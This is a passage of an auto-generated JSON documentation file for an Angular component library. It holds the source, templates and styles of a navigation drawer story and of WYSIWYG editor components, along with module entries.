{\n      control: { type: 'boolean' }\n    }\n  }\n} as Meta;\n\nconst Template: Story<NavDrawerComponent> = (args: NavDrawerComponent) => {\n  return {\n    component: NavDrawerComponent,\n    props: {\n      ...args,\n      activate: action('Activate route')\n    },\n  };\n};\n\nconst navigationItems = [\n  {\n    label: 'Direct route',\n    route: [ '/', 'home' ],\n    icon: 'home'\n  },\n  {\n    label: 'Disabled',\n    route: [ '/', 'home' ],\n    icon: 'do_disturb',\n    disabled: true\n  },\n  {\n    label: 'Internal route title',\n    children: [\n      {\n        route: [ '/', 'disabled', 'route1' ],\n        disabled: true,\n        label: 'Disabled child route',\n      },\n      {\n        route: [ '/', 'route1' ],\n        label: 'Internal child route',\n      },\n      {\n        route: [ '/', 'route2' ],\n        label: 'Internal child route 2',\n      },\n      {\n        route: [ '/', 'route3' ],\n        label: 'Internal child route 3',\n      },\n      {\n        route: [ '/', 'route4' ],\n        label: 'Internal child route 4',\n      },\n      {\n        route: [ '/', 'route5' ],\n        label: 'Internal child route 5',\n      },\n      {\n        route: [ '/', 'route6' ],\n        label: 'Internal child route 6',\n      },\n    ],\n    icon: 'dashboard',\n    title: 'Dashboard'\n  },\n  {\n    label: 'External',\n    divider: 'above',\n    children: [\n      {\n        link: 'https://example.com',\n        target: '_blank',\n        label: 'Example.com',\n      }\n    ],\n    icon: 'open_in_new',\n  },\n  {\n    link: '#',\n    label: 'Disabled Route',\n    children: [],\n    icon: 'do_disturb',\n    disabled: true\n  },\n] as Array<Navigation>;\n\nexport const NormalUse = Template.bind({});\nNormalUse.args = {\n  navigationItems,\n  collapsed: false,\n};\n\n\nexport const WithAppHeader = (args: NavDrawerComponent) => {\n  return {\n    component: NavDrawerComponent,\n    props: { ...args, activate: action('Activate route') },\n    template: `\n    <sto-app-header></sto-app-header>\n    <sto-nav-drawer (activate)=\"collapsed = true; activate($event)\" [withAppHeader]=\"true\" [navigationItems]=\"navigationItems\" [collapsed]=\"collapsed\"></sto-nav-drawer>\n    `\n  };\n};\nWithAppHeader.args = {\n  navigationItems,\n  collapsed: true,\n\n};\n\n\n",
      "assetsDirs": [],
      "styleUrlsData": "",
      "stylesData": ""
    },
    {
      "name": "WysiwygActionsComponent",
      "id": "component-WysiwygActionsComponent-9d16e6a3572223b3000a6b6881d122bfc2fc7d1c9e794d27a34b180bc411b2bc26b011d1f1dd152114950ec1cfb0f7337fa8b6284639ab8c532b409afbe51a2f",
      "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg-actions/wysiwyg-actions.component.ts",
      "encapsulation": [],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-wysiwyg-actions",
      "styleUrls": [
        "./wysiwyg-actions.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./wysiwyg-actions.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "active",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 10,
          "type": "string[]",
          "decorators": []
        },
        {
          "name": "disabled",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 12,
          "type": "boolean",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "modifier",
          "defaultValue": "new EventEmitter<string>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 14,
          "type": "EventEmitter"
        }
      ],
      "propertiesClass": [],
      "methodsClass": [],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import { Component, EventEmitter, Input, Output } from '@angular/core';\n\n@Component({\n  selector: 'sto-wysiwyg-actions',\n  templateUrl: './wysiwyg-actions.component.html',\n  styleUrls: [ './wysiwyg-actions.component.scss' ]\n})\nexport class WysiwygActionsComponent {\n  @Input()\n  active: string[];\n  @Input()\n  disabled: boolean;\n  @Output()\n  modifier = new EventEmitter<string>();\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": ".sto-wysiwyg {\n\n}\n",
          "styleUrl": "./wysiwyg-actions.component.scss"
        }
      ],
      "stylesData": "",
      "templateData": "<div class=\"sto-wysiwyg__actions\">\n  <div class=\"sto-wysiwyg__buttons\">\n    <ng-container *ngIf=\"!disabled\">\n      <mat-button-toggle-group [multiple]=\"true\"\n                               [value]=\"active\">\n        <mat-button-toggle value=\"bold\"\n                           title=\"Bold (ctrl + b)\"\n                           (change)=\"modifier.emit($event.value)\">\n          <mat-icon>format_bold</mat-icon>\n        </mat-button-toggle>\n        <mat-button-toggle value=\"italic\"\n                           title=\"Italic (ctrl + i)\"\n                           (change)=\"modifier.emit($event.value)\">\n          <mat-icon>format_italic</mat-icon>\n        </mat-button-toggle>\n        <mat-button-toggle value=\"underline\"\n                           title=\"Underline (ctrl + u)\"\n                           (change)=\"modifier.emit($event.value)\">\n          <mat-icon>format_underline</mat-icon>\n        </mat-button-toggle>\n      </mat-button-toggle-group>\n      <div class=\"divider\"></div>\n      <button mat-flat-button\n              title=\"Insert hyperlink\"\n              (click)=\"modifier.emit('createLink')\"\n              class=\"sto-wysiwyg__editor__button\">\n        <mat-icon>link</mat-icon>\n      </button>\n      <div class=\"divider\"></div>\n      <button mat-flat-button\n              title=\"Create unordered list\"\n              (click)=\"modifier.emit('insertUnorderedList')\"\n              class=\"sto-wysiwyg__editor__button\">\n        <mat-icon>format_list_bulleted</mat-icon>\n      </button>\n      <button mat-flat-button\n              title=\"Create ordered list\"\n              (click)=\"modifier.emit('insertOrderedList')\"\n              class=\"sto-wysiwyg__editor__button\">\n        <mat-icon>format_list_numbered</mat-icon>\n      </button>\n      <div class=\"divider\"></div>\n      <button mat-flat-button\n              title=\"Clear formatting on selection\"\n              (click)=\"modifier.emit('removeFormat')\"\n              class=\"sto-wysiwyg__editor__button\">\n        <mat-icon>format_clear</mat-icon>\n      </button>\n    </ng-container>\n  </div>\n  <div class=\"user-buttons\">\n    <ng-content></ng-content>\n  </div>\n</div>\n"
    },
    {
      "name": "WysiwygComponent",
      "id": "component-WysiwygComponent-7924fffc4ef64dc2d5780bef51a9ca2fff14ac45173e3b4baf27579ba66187079858176317e9347090e5e33c88ea6dd9dc4c86ae10122e50fc289cb35d2a6f16",
      "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.component.ts",
      "changeDetection": "ChangeDetectionStrategy.OnPush",
      "encapsulation": [
        "ViewEncapsulation.None"
      ],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [
        {
          "name": "{\n    provide: NG_VALUE_ACCESSOR, useExisting: forwardRef(() => WysiwygComponent), multi: true\n}",
          "type": "component"
        }
      ],
      "selector": "sto-wysiwyg",
      "styleUrls": [
        "./wysiwyg.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./wysiwyg.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "readonly",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 39,
          "type": "boolean",
          "decorators": []
        }
      ],
      "outputsClass": [],
      "propertiesClass": [
        {
          "name": "active",
          "defaultValue": "[]",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string[]",
          "optional": false,
          "description": "",
          "line": 44,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "destroyed$",
          "defaultValue": "new Subject<boolean>()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 40,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "editor",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ElementRef<HTMLDivElement>",
          "optional": false,
          "description": "",
          "line": 42,
          "decorators": [
            {
              "name": "ViewChild",
              "stringifiedArguments": "WysiwygEditorComponent, {read: ElementRef}"
            }
          ]
        },
        {
          "name": "onTouched",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 45,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "propagateChange",
          "defaultValue": "() => {...}",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 115
        },
        {
          "name": "value",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "SafeHtml",
          "optional": false,
          "description": "",
          "line": 43,
          "modifierKind": [
            123
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "execute",
          "args": [
            {
              "name": "method",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 77,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "method",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "listenForSelectEvents",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 63,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ]
        },
        {
          "name": "ngAfterViewInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 54,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnDestroy",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 58,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "onKeyDownHandleTab",
          "args": [
            {
              "name": "event",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 94,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "event",
              "type": "KeyboardEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "registerOnChange",
          "args": [
            {
              "name": "fn",
              "type": "never",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 119,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "fn",
              "type": "never",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "registerOnTouched",
          "args": [
            {
              "name": "fn",
              "type": "",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 123,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "fn",
              "type": "",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "setDisabledState",
          "args": [
            {
              "name": "isDisabled",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 127,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "isDisabled",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "valueChanged",
          "args": [
            {
              "name": "value",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 132,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "value",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "writeValue",
          "args": [
            {
              "name": "value",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 107,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "value",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import {\n  AfterViewInit,\n  ChangeDetectionStrategy,\n  ChangeDetectorRef,\n  Component,\n  ElementRef,\n  forwardRef,\n  Input,\n  NgZone,\n  OnDestroy,\n  SecurityContext,\n  ViewChild,\n  ViewEncapsulation\n} from '@angular/core';\nimport { DomSanitizer, SafeHtml } from '@angular/platform-browser';\nimport { fromEvent, merge, Subject } from 'rxjs';\nimport { debounceTime, filter, takeUntil } from 'rxjs/operators';\nimport { WysiwygEditorComponent } from './wysiwyg-editor/wysiwyg-editor.component';\nimport { Modifiers, validCommands } from './modifiers';\nimport { ControlValueAccessor, NG_VALUE_ACCESSOR } from '@angular/forms';\n\n@Component({\n  selector: 'sto-wysiwyg',\n  templateUrl: './wysiwyg.component.html',\n  styleUrls: [ './wysiwyg.component.scss' ],\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush,\n  providers: [\n    {\n      provide: NG_VALUE_ACCESSOR,\n      useExisting: forwardRef(() => WysiwygComponent),\n      multi: true\n    }\n  ],\n})\nexport class WysiwygComponent implements AfterViewInit, OnDestroy, ControlValueAccessor {\n  // eslint-disable-next-line @angular-eslint/no-input-rename\n  @Input('readonly')\n  disabled: boolean;\n  private destroyed$ = new Subject<boolean>();\n  @ViewChild(WysiwygEditorComponent, { read: ElementRef })\n  editor: ElementRef<HTMLDivElement>;\n  public value: SafeHtml;\n  public active: string[] = [];\n  public onTouched: unknown;\n\n  constructor(\n    private domSanitizer: DomSanitizer,\n    private zone: NgZone,\n    private cdr: ChangeDetectorRef\n  ) {\n  }\n\n  ngAfterViewInit() {\n    this.listenForSelectEvents();\n  }\n\n  ngOnDestroy(): void {\n    this.destroyed$.next(true);\n    this.destroyed$.complete();\n  }\n\n  private listenForSelectEvents() {\n    merge(\n      fromEvent(this.editor.nativeElement, 'mouseup'),\n      fromEvent<KeyboardEvent>(this.editor.nativeElement, 'keyup')\n        .pipe(\n          filter((ev) => ( ev.ctrlKey && ev.key === 'A' ) || ( /Arrow/.test(ev.key) ))\n        )\n    ).pipe(debounceTime(200), takeUntil(this.destroyed$))\n      .subscribe(() => {\n        this.active = Modifiers.getActiveModifiers();\n        this.cdr.detectChanges();\n      });\n  }\n\n  execute(method: string) {\n    if ( !validCommands.includes(method) ) {\n      return;\n    }\n    const showUi = method === 'createLink';\n    if ( showUi ) {\n      const url = window.prompt('url');\n      if ( url ) {\n        document.execCommand(method, false, url);\n      }\n    } else {\n      document.execCommand(method, false, '');\n    }\n    this.active = Modifiers.getActiveModifiers();\n    this.cdr.detectChanges();\n  }\n\n  onKeyDownHandleTab(event: KeyboardEvent) {\n    if ( event.key === 'Tab' ) {\n      event.preventDefault();\n      let method: string;\n      if ( event.shiftKey ) {\n        method = 'outdent';\n      } else {\n        method = 'indent';\n      }\n      this.execute(method);\n    }\n  }\n\n  writeValue(value: string): void {\n    if ( value ) {\n      const sanitized = this.domSanitizer.sanitize(SecurityContext.HTML, value) ?? '';\n      this.value = this.domSanitizer.bypassSecurityTrustHtml(sanitized);\n      this.cdr.detectChanges();\n    }\n  }\n  // eslint-disable-next-line\n  propagateChange = (value: unknown) => {\n    console.log(value); // To remove eslint warning..\n  };\n\n  registerOnChange(fn: never): void {\n    this.propagateChange = fn;\n  }\n\n  registerOnTouched(fn: unknown): void {\n    this.onTouched = fn;\n  }\n\n  setDisabledState(isDisabled: boolean): void {\n    this.disabled = isDisabled;\n    this.cdr.detectChanges();\n  }\n\n  valueChanged(value: string) {\n    this.propagateChange(value);\n  }\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": ".sto-wysiwyg {\n  .mat-button-toggle-appearance-standard .mat-button-toggle-label-content {\n    line-height: 36px;\n    padding: 0 6px;\n  }\n\n  &__editor {\n    &__button {\n      min-width: 40px;\n      width: 40px;\n      padding: 0;\n    }\n  }\n\n  &__actions {\n    display: flex;\n    justify-content: space-between;\n    align-items: flex-end;\n    flex-wrap: wrap;\n    min-height: 44px;\n    padding-bottom: 2px;\n\n    .divider {\n      height: 36px;\n      width: 0;\n      margin: 0 4px;\n    }\n\n    .mat-button-toggle-group {\n      border: none;\n\n      .mat-button-toggle {\n        border-left: none;\n        margin-left: 2px;\n\n        &:first-of-type {\n          margin-left: 0;\n        }\n      }\n    }\n  }\n\n\n  min-height: 100px;\n  max-height: 100%;\n  overflow: hidden;\n  height: 100%;\n  border-radius: 2px;\n  padding: 4px 0 8px;\n  display: flex;\n  flex-direction: column;\n\n  &__buttons {\n    flex: 1 1 auto;\n    display: flex;\n    justify-content: flex-start;\n  }\n\n  &__actions {\n    .user-buttons {\n      button {\n        margin: 8px 4px 0;\n      }\n    }\n  }\n\n  &__editor {\n\n    transition: border-color 300ms ease, background-color 200ms ease, height 200ms ease;\n    border-radius: 2px;\n    outline: none;\n    margin-top: 4px;\n    padding: 12px 4px 4px;\n    flex: 1 1 auto;\n    line-height: 18px;\n    overflow: auto;\n\n    &--readonly {\n      background: transparent;\n      border-width: 0;\n    }\n\n    p {\n      margin-bottom: 0;\n    }\n  }\n}\n",
          "styleUrl": "./wysiwyg.component.scss"
        }
      ],
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "domSanitizer",
            "type": "DomSanitizer",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "zone",
            "type": "NgZone",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "cdr",
            "type": "ChangeDetectorRef",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 45,
        "jsdoctags": [
          {
            "name": "domSanitizer",
            "type": "DomSanitizer",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "zone",
            "type": "NgZone",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "cdr",
            "type": "ChangeDetectorRef",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "implements": [
        "AfterViewInit",
        "OnDestroy",
        "ControlValueAccessor"
      ],
      "templateData": "<div class=\"sto-wysiwyg\">\n  <sto-wysiwyg-actions [active]=\"active\"\n                       [disabled]=\"disabled\"\n                       (modifier)=\"execute($event)\">\n    <ng-content></ng-content>\n  </sto-wysiwyg-actions>\n  <sto-wysiwyg-editor [readonly]=\"disabled\"\n                      [content]=\"value\"\n                      (valueChanged)=\"valueChanged($event)\"\n                      (keydown)=\"onKeyDownHandleTab($event)\"></sto-wysiwyg-editor>\n</div>\n"
    },
    {
      "name": "WysiwygEditorComponent",
      "id": "component-WysiwygEditorComponent-f3d1f957e078e9da1938b1e3838cef6cb2ce2034ae317b06aca87bd49794800a93f52c817147f82ea7e45e524dd0490eeb769e8090982674d2fd9fa77080f5c1",
      "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg-editor/wysiwyg-editor.component.ts",
      "encapsulation": [],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-wysiwyg-editor",
      "styleUrls": [
        "./wysiwyg-editor.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./wysiwyg-editor.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "content",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 13,
          "type": "SafeHtml",
          "decorators": []
        },
        {
          "name": "readonly",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 15,
          "type": "boolean",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "valueChanged",
          "defaultValue": "new EventEmitter<string>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 19,
          "type": "EventEmitter"
        }
      ],
      "propertiesClass": [
        {
          "name": "destroyed$",
          "defaultValue": "new Subject<boolean>()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 22,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "editor",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ElementRef<HTMLDivElement>",
          "optional": false,
          "description": "",
          "line": 17,
          "decorators": [
            {
              "name": "ViewChild",
              "stringifiedArguments": "'editor'"
            }
          ]
        },
        {
          "name": "warning",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string | null",
          "optional": false,
          "description": "",
          "line": 20,
          "modifierKind": [
            123
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "insertImage",
          "args": [
            {
              "name": "img",
              "type": "File",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 104,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": "img",
              "type": "File",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "listenForValueChange",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 37,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ]
        },
        {
          "name": "ngAfterViewInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 33,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnDestroy",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 28,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "onDrop",
          "args": [
            {
              "name": "event",
              "type": "DragEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 134,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "event",
              "type": "DragEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "onPaste",
          "args": [
            {
              "name": "event",
              "type": "ClipboardEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 48,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "event",
              "type": "ClipboardEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "pasteText",
          "args": [
            {
              "name": "event",
              "type": "ClipboardEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 64,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": "event",
              "type": "ClipboardEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "stripImageSection",
          "args": [
            {
              "name": "html",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 89,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            121
          ],
          "jsdoctags": [
            {
              "name": "html",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import { AfterViewInit, Component, ElementRef, EventEmitter, Input, NgZone, OnDestroy, Output, ViewChild } from '@angular/core';\nimport { SafeHtml } from '@angular/platform-browser';\nimport { fromEvent, Subject } from 'rxjs';\nimport { debounceTime, takeUntil } from 'rxjs/operators';\n\n@Component({\n  selector: 'sto-wysiwyg-editor',\n  templateUrl: './wysiwyg-editor.component.html',\n  styleUrls: [ './wysiwyg-editor.component.scss' ]\n})\nexport class WysiwygEditorComponent implements AfterViewInit, OnDestroy {\n  @Input()\n  content: SafeHtml;\n  @Input()\n  readonly: boolean;\n  @ViewChild('editor')\n  editor: ElementRef<HTMLDivElement>;\n  @Output()\n  valueChanged = new EventEmitter<string>();\n  public warning: string | null;\n\n  private destroyed$ = new Subject<boolean>();\n\n  constructor(private zone: NgZone) {\n  }\n\n\n  ngOnDestroy(): void {\n    this.destroyed$.next(true);\n    this.destroyed$.complete();\n  }\n\n  ngAfterViewInit() {\n    this.listenForValueChange();\n  }\n\n  private listenForValueChange() {\n    fromEvent(this.editor.nativeElement, 'input')\n      .pipe(\n        debounceTime(100),\n        takeUntil(this.destroyed$)\n      ).subscribe(ev => {\n      this.warning = null;\n      this.valueChanged.emit(( ev.target as HTMLElement ).innerHTML);\n    });\n  }\n\n  onPaste(event: ClipboardEvent) {\n    if ( this.readonly ) {\n      return;\n    }\n    if (!event.clipboardData) {\n      return;\n    }\n    const img = event.clipboardData.files.item(0);\n    if ( !!img && img.type.includes('image') ) {\n      // event.preventDefault();\n      this.insertImage(img);\n    } else if ( !img ) {\n      this.pasteText(event);\n    }\n  }\n\n  private pasteText(event: ClipboardEvent) {\n    if (!event.clipboardData) {\n      return;\n    }\n    const html = event.clipboardData.getData('text/html');\n    const hasImage: boolean = /<img/.test(html);\n    if ( hasImage ) {\n      event.preventDefault();\n      this.warning = `Some images were not included due to browser security around mixed content. Try to paste the image separately.`;\n      const stripped = this.stripImageSection(html);\n      const el = document.createElement('div');\n      el.innerHTML = stripped;\n      const sel = document.getSelection();\n      if (!sel) {\n        return;\n      }\n      const range = sel.getRangeAt(0);\n      range.deleteContents();\n      range.insertNode(el);\n      sel.removeAllRanges();\n      range.collapse();\n      sel.addRange(range);\n    }\n  }\n\n  private stripImageSection(html: string) {\n    const div = document.createElement('div');\n    div.innerHTML = html;\n    const images = div.querySelectorAll('img');\n    Array.from(images)\n      .forEach(image => {\n        let el = image as HTMLElement;\n        while ( el.parentElement && el.parentElement !== div ) {\n          el = el.parentElement;\n        }\n        div.removeChild(el);\n      });\n    return div.innerHTML;\n  }\n\n  private insertImage(img: File) {\n    const fr = new FileReader();\n    fr.onloadend = (loadEvent) => {\n      this.zone.runOutsideAngular(() => {\n        const res = ( loadEvent.currentTarget as FileReader ).result as string;\n        const el = document.createElement('img');\n        el.title = `${img.name}`;\n        el.src = res;\n        el.style.maxHeight = '300px';\n        const sel = document.getSelection();\n        if (!sel) {\n          return;\n        }\n        const range = sel.getRangeAt(0);\n        const cont = range.endContainer;\n        if ( !this.editor.nativeElement.contains(cont) ) {\n          range.setStart(this.editor.nativeElement, 0);\n        }\n        range.deleteContents();\n        range.insertNode(el);\n        sel.removeAllRanges();\n        range.collapse();\n        sel.addRange(range);\n        this.valueChanged.emit(this.editor.nativeElement.innerHTML);\n        this.warning = null;\n      });\n    };\n    fr.readAsDataURL(img);\n  }\n\n  onDrop(event: DragEvent) {\n    if ( this.readonly || !event.dataTransfer ) {\n      return;\n    }\n    if ( event.dataTransfer.types.includes('Files') ) {\n      event.preventDefault();\n      const img = event.dataTransfer.files.item(0);\n      if (img) {\n        this.insertImage(img);\n      }\n    }\n  }\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": ":host {\n  display: contents;\n}\n",
          "styleUrl": "./wysiwyg-editor.component.scss"
        }
      ],
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "zone",
            "type": "NgZone",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 22,
        "jsdoctags": [
          {
            "name": "zone",
            "type": "NgZone",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "implements": [
        "AfterViewInit",
        "OnDestroy"
      ],
      "templateData": "<div class=\"sto-wysiwyg__editor\"\n     (dragover)=\"$event.preventDefault(); $event.stopPropagation();\"\n     (drop)=\"onDrop($event)\"\n     [class.sto-wysiwyg__editor--readonly]=\"readonly\"\n     [innerHTML]=\"content\"\n     (paste)=\"onPaste($event)\"\n     #editor\n     [attr.contenteditable]=\"!readonly\"></div>\n<span class=\"error\"\n      *ngIf=\"warning\">{{ warning }}</span>\n"
    }
  ],
  "modules": [
    {
      "name": "AppModule",
      "id": "module-AppModule-6b98c3c06f4088d367b67db6b8ca962f2166437258de481afb8e3f7b2d921004abf7396765acbf24f818ef7402b10a733f82ea94f88a50173678500d4deb9259",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "apps/oilmod-web/src/app/app.module.ts",
      "methods": [],
      "sourceCode": "import { NgModule } from '@angular/core';\nimport { BrowserModule } from '@angular/platform-browser';\n\nimport { AppComponent } from './app.component';\n\n@NgModule({\n  declarations: [AppComponent],\n  imports: [BrowserModule],\n  providers: [],\n  bootstrap: [AppComponent],\n})\nexport class AppModule {}\n",
      "children": [
        {
          "type": "providers",
          "elements": []
        },
        {
          "type": "declarations",
          "elements": [
            {
              "name": "AppComponent"
            }
          ]
        },
        {
          "type": "imports",
          "elements": []
        },
        {
          "type": "exports",
          "elements": []
        },
        {
          "type": "bootstrap",
          "elements": [
            {
              "name": "AppComponent"
            }
          ]
        },
        {
          "type": "classes",
          "elements": []
        }
      ]
    },
    {
      "name": "ConfirmerModule",
      "id": "module-ConfirmerModule-7f57b03e449d3dd4e736b3632d2374fd565da8f6074baf0b083d655a800c0213fc01df5a06fc8844e8a8f256122b1833c220a92e5ea94f56c597d517f7f02867",
      "description": "",
      "deprecationMessage": "",
      "deprecated": false,
      "file": "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts",
      "methods": [],
